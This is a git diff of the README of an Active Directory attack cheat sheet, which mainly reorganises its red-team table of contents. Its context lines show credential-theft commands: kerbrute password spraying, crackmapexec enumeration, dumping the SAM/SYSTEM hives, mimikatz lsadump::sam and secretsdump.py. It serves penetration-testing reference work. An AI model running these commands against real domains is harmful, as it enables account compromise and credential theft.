@@ -1,50 +1,42 @@
-This AD attacks CheatSheet, made by RistBS is inspired by the [Active-Directory-Exploitation-Cheat-Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet) repo.
+---
 
-it is the first version of this repo, many things will be added later, so stay tuned ! :D
+![image](https://user-images.githubusercontent.com/75935486/169690637-2f7bd0c1-0799-4e6e-b38c-809f086ea156.png)
 
-**Information : some courses will be in French because I don't have time to translate everything but don't worry it will be translated in some time.**
+---
 
-## Red Team Bible
+#  Red Team Techniques
+- [Initial Access Techniques](https://github.com/RistBS/Awesome-RedTeam-Cheatsheet/blob/master/Techniques/Initial%20Access%20Techniques.md) (soon)
+- [Code Execution Techniques](https://github.com/RistBS/Awesome-RedTeam-Cheatsheet/blob/master/Techniques/Code%20Execution%20Techniques.md) (soon)
+- [Lateral Mouvement Techniques](https://github.com/RistBS/Awesome-RedTeam-Cheatsheet/blob/master/Techniques/Lateral%20Mouvement%20Techniques.md) (soon)
+- [Evasion Techniques](https://github.com/RistBS/Awesome-RedTeam-Cheatsheet/blob/master/Techniques/Evasion%20Techniques.md) (soon)
+- [Persistence Techniques](https://github.com/RistBS/Awesome-RedTeam-Cheatsheet/blob/master/Techniques/Persistence%20Techniques.md) (soon)
+- [Privilege Escalation Techniques](https://github.com/RistBS/Awesome-RedTeam-Cheatsheet/blob/master/Techniques/Privilege%20Escalation%20Techniques.md) (soon)
+- [Credential Dumping Techniques](https://github.com/RistBS/Awesome-RedTeam-Cheatsheet/blob/master/Techniques/Credential%20Dumping%20Techniques.md) (soon)
+- [Pivoting Techniques](https://github.com/RistBS/Awesome-RedTeam-Cheatsheet/blob/master/Techniques/Pivoting%20Cheatsheet.md) (soon)
+---
 
-![image](https://user-images.githubusercontent.com/75935486/151707710-02f88a24-5db5-4829-bf15-3bf2f398b90a.png)
+## Windows Protocols and Terminologies
 
-**Red Team Techniques**
+- **[Windows Protocols and Terminologies Guide](https://github.com/RistBS/Awesome-RedTeam-Cheatsheet/blob/master/Active%20Directory%20Protcols%20Guide.md) (soon)**
 
-  - [EN/FR - Exploit Development against Windows Protocols](https://github.com/RistBS/Active-directory-Cheat-sheet/blob/exploit-development/FR%20-%20Programmation%20Python%20avec%20impacket%20contre%20les%20protocoles%2)
-  - [EN/FR - BITS Jobs Abusing]()
-  - [EN/FR - ETW Patching](https://github.com/RistBS/Active-directory-Cheat-sheet/blob/exploit-development/FR%20-%20ETW%20Bypassing.md)
-  - [EN/FR - Win API Abusing](https://github.com/RistBS/Active-directory-Cheat-sheet/tree/red-team-bible/Win%20API%20Abusing)
-    - [Process Injection Techniques](https://github.com/RistBS/Active-directory-Cheat-sheet/blob/evasion/Process%20Injection%20Techniques)
-      - [Process Reimaging]()
-      - [Process Doppelganging]()
-      - [Process Herpaderping]()
-      - [Process Hollowing]()
-      - [Process Ghosting](https://github.com/RistBS/Active-directory-Cheat-sheet/blob/evasion/Process%20Injection%20Techniques/Process%20Ghosting.md)
-      - [Shellcode injection using CreateThreadPoolWait API]()
-  - [EN/FR - Payload Delivery Techniques](https://github.com/RistBS/Active-directory-Cheat-sheet/tree/evasion/payload-delivery)
-    - [HTML Smuggling](https://github.com/RistBS/Active-directory-Cheat-sheet/blob/evasion/payload-delivery/FR%20-%20HTML%20Smuggling.md)
-  - [Evasion]()
-    - [COR_PROFILER](https://github.com/RistBS/Active-directory-Cheat-sheet/blob/evasion/COR_PROFILER.md)
-  - [Bypass Security Components](none)
-    - [Application Whitelisting Bypass (AWL)]()
-    - [Sandbox Evasion]()
-    - [Windows Defender Application Control (WDAC)]()
-  - [Lateral Mouvement]()
-    - [Fileless Lateral Mouvement]()
-    - [ShadowMove]()
-    - [RDP Hijacking]()
+---
 
-**Attacking Office 365 :**
-  - [FR - Phishing Microsoft Access via ACCDE & MAM](https://github.com/RistBS/Active-directory-Cheat-sheet/blob/attacking-microsoft365/Phishing-Acess-via-accde-and-mam.md)
+## Miscs
+- [OPSEC Guide](https://github.com/RistBS/Awesome-RedTeam-Cheatsheet/blob/master/Miscs/OPSEC%20Guide.md) 
+- [Malware Development](https://github.com/RistBS/Awesome-RedTeam-Cheatsheet/blob/master/Miscs/Malware%20Development.md)
+- [Attacking AD Azure Cloud](https://github.com/RistBS/Awesome-RedTeam-Cheatsheet/blob/master/Miscs/Attacking%20AD%20Azure%20Cloud.md) (soon)
+---
 
+# Support
 
-**Binary Exploitation & Shellcoding :**
+**You can support me here :cat: :**
 
-  - [x86 assembly basics](https://github.com/RistBS/Active-directory-Cheat-sheet/blob/binary-exploitation-and-shellcoding/x86%20basics.md)
-
+<a href="https://www.buymeacoffee.com/RistBS"><img width=300 src="https://img.buymeacoffee.com/button-api/?text=Buy me a Pizza&emoji=🍕&slug=bsolomon&button_colour=5F7FFF&font_colour=000000&font_family=Poppins&outline_colour=000000&coffee_colour=ffffff"></a>
 
 
 # Active-directory-Cheat-sheet
+
+This AD attacks CheatSheet, made by RistBS is inspired by the [Active-Directory-Exploitation-Cheat-Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet) repo.
 
 ## Summary
 
@@ -121,6 +113,8 @@ it is the first version of this repo, many things will be added later, so stay t
       - [Rogue DHCP](#rogue-dhcp)
       - [IOXIDResolver Interface Enumeration](#ioxidresolver-interface-enumeration)
     - [References](#references)
+
+
 
 
 ## Tools
@@ -317,6 +311,7 @@ crackmapexec smb 10.10.13.100 --pass-pol -u users.lst -p password_list
 ```bash
 crackmapexec smb 10.10.13.100 -u users.txt -p $pass --users | tee userlist.txt
 ```
+
 ### Password Spraying on the domain
 ```bash
 /opt/kerbrute/dist/kerbrute_linux_amd64 passwordspray -d MEGACORP.CORP --dc 10.10.13.100 users.lst '$pass'
@@ -605,6 +600,8 @@ reg save HKLM\SYSTEM c:\path\to\SYSTEM
 ```powershell
 lsadump::sam /system:c:\path\to\SYSTEM /sam:c:c:\path\to\SAM
 ```
+or just use : `lsadump::sam`
+
 **[ 📝 ] Notes** : *you can dump SAM and LSA with crackmapexec **or** secretdump using these commands :*
 ```bash
 secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
@@ -1334,7 +1331,7 @@ use crackmapexec (CME) with maq module :
 
 `cme ldap $dc -d $DOMAIN -u $USER -p $PASSWORD -M maq`
 
-#### BadPwnCount
+#### BadPwdCount
 ```python
 crackmapexec ldap 10.10.13.100 -u $user -p $pwd --kdcHost 10.10.13.100 --users
 LDAP        10.10.13.100       389    dc1       Guest      badpwdcount: 0 pwdLastSet: <never>
